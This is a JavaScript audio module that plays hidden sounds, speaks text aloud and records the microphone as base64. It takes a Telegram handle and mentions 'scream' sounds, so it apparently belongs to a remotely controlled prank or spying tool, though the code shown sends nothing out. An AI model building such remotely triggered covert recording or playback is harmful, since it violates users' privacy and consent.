// ============================================
// AUDIO CONTROLLER MODULE v2.0
// PLAY AUDIO, RECORD, TTS, SCREAM, DLL
// Copyright © VROZZ
// ============================================

class AudioController {
    constructor(config, telegram) {
        this.config = config.audio;
        this.telegram = telegram;
        this.audioContext = null;
        this.currentAudio = null;
        this.mediaRecorder = null;
        this.audioChunks = [];
        this.isPlaying = false;
        this.isRecording = false;
        this.audioQueue = [];
        this.gainNode = null;
        
        // Init audio context
        this.initAudioContext();
    }
    
    // Init AudioContext (butuh user interaction)
    initAudioContext() {
        try {
            window.AudioContext = window.AudioContext || window.webkitAudioContext;
            this.audioContext = new AudioContext();
            
            // Create gain node for volume control
            this.gainNode = this.audioContext.createGain();
            this.gainNode.connect(this.audioContext.destination);
            
            // Resume kalo suspended
            if (this.audioContext.state === 'suspended') {
                const resumeAudio = () => {
                    this.audioContext.resume();
                    document.removeEventListener('click', resumeAudio);
                    document.removeEventListener('touchstart', resumeAudio);
                };
                
                document.addEventListener('click', resumeAudio);
                document.addEventListener('touchstart', resumeAudio);
            }
        } catch (e) {
            console.log('AudioContext not supported:', e);
        }
    }
    
    // Set volume master
    setVolume(volume) {
        if (this.gainNode) {
            const vol = Math.max(0, Math.min(1, volume));
            this.gainNode.gain.value = vol;
        }
    }
    
    // Play dari URL
    async playFromUrl(url, volume = null, loop = false) {
        try {
            // Stop current
            this.stop();
            
            // Use default volume if not specified
            const vol = volume !== null ? volume : this.config.DEFAULT_VOLUME;
            
            // Create audio element
            const audio = new Audio(url);
            audio.volume = vol;
            audio.loop = loop;
            
            // Hide from UI
            if (this.config.HIDE_AUDIO_CONTROLS) {
                audio.style.display = 'none';
                document.body.appendChild(audio);
            }
            
            // Play
            await audio.play();
            
            this.currentAudio = audio;
            this.isPlaying = true;
            
            // Handle ended
            audio.onended = () => {
                this.isPlaying = false;
                if (this.config.HIDE_AUDIO_CONTROLS && document.body.contains(audio)) {
                    document.body.removeChild(audio);
                }
            };
            
            return {
                status: 'success',
                message: `Playing audio from URL: ${url}`,
                duration: audio.duration || 'unknown'
            };
        } catch (e) {
            return {
                status: 'error',
                message: `Failed to play: ${e.message}`
            };
        }
    }
    
    // Play dari Base64
    playFromBase64(base64String, volume = null, loop = false) {
        try {
            // Convert base64 to blob
            const byteCharacters = atob(base64String);
            const byteNumbers = new Array(byteCharacters.length);
            
            for (let i = 0; i < byteCharacters.length; i++) {
                byteNumbers[i] = byteCharacters.charCodeAt(i);
            }
            
            const byteArray = new Uint8Array(byteNumbers);
            const blob = new Blob([byteArray], { type: 'audio/mp3' });
            
            // Create URL from blob
            const url = URL.createObjectURL(blob);
            
            // Play
            return this.playFromUrl(url, volume, loop);
        } catch (e) {
            return {
                status: 'error',
                message: `Base64 decode error: ${e.message}`
            };
        }
    }
    
    // Play preset sound
    playPreset(presetName, volume = null, loop = false) {
        const preset = this.config.PRESET_SOUNDS[presetName];
        
        if (!preset) {
            return {
                status: 'error',
                message: `Preset "${presetName}" not found`
            };
        }
        
        // Check if base64 or URL
        if (preset.startsWith('base64:')) {
            const base64Data = preset.replace('base64:', '');
            return this.playFromBase64(base64Data, volume, loop);
        } else {
            return this.playFromUrl(preset, volume, loop);
        }
    }
    
    // Text-to-Speech
    textToSpeech(text, volume = null, lang = null) {
        return new Promise((resolve, reject) => {
            try {
                // Stop current
                this.stop();
                
                // Check support
                if (!window.speechSynthesis) {
                    return resolve({
                        status: 'error',
                        message: 'TTS not supported in this browser'
                    });
                }
                
                // Use defaults
                const vol = volume !== null ? volume : this.config.DEFAULT_VOLUME;
                const language = lang || this.config.DEFAULT_TTS_LANG;
                
                // Create utterance
                const utterance = new SpeechSynthesisUtterance(text);
                utterance.lang = language;
                utterance.volume = vol;
                utterance.rate = this.config.TTS_RATE || 1.0;
                utterance.pitch = this.config.TTS_PITCH || 1.0;
                
                // Get available voices
                const voices = window.speechSynthesis.getVoices();
                
                // Find voice for language
                const voiceForLang = voices.find(v => v.lang === language);
                if (voiceForLang) {
                    utterance.voice = voiceForLang;
                }
                
                // Events
                utterance.onstart = () => {
                    this.isPlaying = true;
                };
                
                utterance.onend = () => {
                    this.isPlaying = false;
                    resolve({
                        status: 'success',
                        message: `TTS finished: "${text}"`,
                        text: text,
                        lang: language
                    });
                };
                
                utterance.onerror = (e) => {
                    this.isPlaying = false;
                    resolve({
                        status: 'error',
                        message: `TTS error: ${e.error}`
                    });
                };
                
                // Speak
                window.speechSynthesis.speak(utterance);
                
            } catch (e) {
                resolve({
                    status: 'error',
                    message: `TTS exception: ${e.message}`
                });
            }
        });
    }
    
    // Start recording from microphone
    async startRecording(duration = null) {
        try {
            // Check if already recording
            if (this.isRecording) {
                return {
                    status: 'error',
                    message: 'Already recording'
                };
            }
            
            // Request mic access
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            
            // Setup recorder
            this.mediaRecorder = new MediaRecorder(stream, {
                mimeType: this.config.RECORD_FORMAT
            });
            
            this.audioChunks = [];
            
            // Collect data
            this.mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    this.audioChunks.push(event.data);
                }
            };
            
            // When stopped
            this.mediaRecorder.onstop = () => {
                this.isRecording = false;
                
                // Stop all tracks
                stream.getTracks().forEach(track => track.stop());
            };
            
            // Start recording
            this.mediaRecorder.start();
            this.isRecording = true;
            
            // Auto-stop after duration
            const recordDuration = duration || this.config.RECORD_DURATION;
            
            setTimeout(() => {
                if (this.isRecording) {
                    this.stopRecording();
                }
            }, recordDuration * 1000);
            
            return {
                status: 'success',
                message: `Recording started for ${recordDuration} seconds`,
                duration: recordDuration
            };
            
        } catch (e) {
            return {
                status: 'error',
                message: `Failed to start recording: ${e.message}`
            };
        }
    }
    
    // Stop recording and get audio blob
    async stopRecording() {
        return new Promise((resolve) => {
            if (!this.mediaRecorder || this.mediaRecorder.state === 'inactive') {
                return resolve({
                    status: 'error',
                    message: 'No active recording'
                });
            }
            
            this.mediaRecorder.onstop = () => {
                this.isRecording = false;
                
                // Create blob from chunks
                const audioBlob = new Blob(this.audioChunks, {
                    type: this.config.RECORD_FORMAT
                });
                
                // Create URL
                const audioUrl = URL.createObjectURL(audioBlob);
                
                // Convert to base64 if needed
                const reader = new FileReader();
                reader.readAsDataURL(audioBlob);
                reader.onloadend = () => {
                    const base64data = reader.result;
                    
                    resolve({
                        status: 'success',
                        message: 'Recording stopped',
                        blob: audioBlob,
                        url: audioUrl,
                        base64: base64data,
                        size: audioBlob.size,
                        duration: this.audioChunks.length
                    });
                };
            };
            
            this.mediaRecorder.stop();
        });
    }
    
    // Play multiple sounds in sequence
    async playQueue(sounds) {
        for (const sound of sounds) {
            let result;
            
            if (sound.type === 'url') {
                result = await this.playFromUrl(sound.src, sound.volume, sound.loop);
            } else if (sound.type === 'preset') {
                result = await this.playPreset(sound.name, sound.volume, sound.loop);
            } else if (sound.type === 'tts') {
                result = await this.textToSpeech(sound.text, sound.volume, sound.lang);
            }
            
            // Wait for sound to finish
            await new Promise(resolve => {
                const check = setInterval(() => {
                    if (!this.isPlaying) {
                        clearInterval(check);
                        resolve();
                    }
                }, 100);
            });
        }
        
        return {
            status: 'success',
            message: 'Queue finished'
        };
    }
    
    // Stop all audio
    stop() {
        // Stop HTML5 Audio
        if (this.currentAudio) {
            this.currentAudio.pause();
            this.currentAudio.currentTime = 0;
            
            if (this.config.HIDE_AUDIO_CONTROLS && 
                document.body.contains(this.currentAudio)) {
                document.body.removeChild(this.currentAudio);
            }
            
            this.currentAudio = null;
        }
        
        // Stop TTS
        if (window.speechSynthesis) {
            window.speechSynthesis.cancel();
        }
        
        // Stop Web Audio API
        if (this.audioContext && this.audioContext.state === 'running') {
            // Disconnect all nodes
            if (this.gainNode) {
                this.gainNode.disconnect();
            }
        }
        
        this.isPlaying = false;
        
        return {
            status: 'success',
            message: 'All audio stopped'
        };
    }
    
    // Pause current audio
    pause() {
        if (this.currentAudio) {
            this.currentAudio.pause();
            this.isPlaying = false;
            return {
                status: 'success',
                message: 'Audio paused'
            };
        }
        
        return {
            status: 'error',
            message: 'No audio playing'
        };
    }
    
    // Resume paused audio
    resume() {
        if (this.currentAudio) {
            this.currentAudio.play();
            this.isPlaying = true;
            return {
                status: 'success',
                message: 'Audio resumed'
            };
        }
        
        return {
            status: 'error',
            message: 'No audio paused'
        };
    }
    
    // Get list of available presets
    getPresetList() {
        return Object.keys(this.config.PRESET_SOUNDS);
    }
    
    // Check if audio is playing
    getStatus() {
        return {
            isPlaying: this.isPlaying,
            isRecording: this.isRecording,
            currentTime: this.currentAudio ? this.currentAudio.currentTime : 0,
            duration: this.currentAudio ? this.currentAudio.duration : 0,
            volume: this.currentAudio ? this.currentAudio.volume : this.config.DEFAULT_VOLUME
        };
    }
}

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = AudioController;
}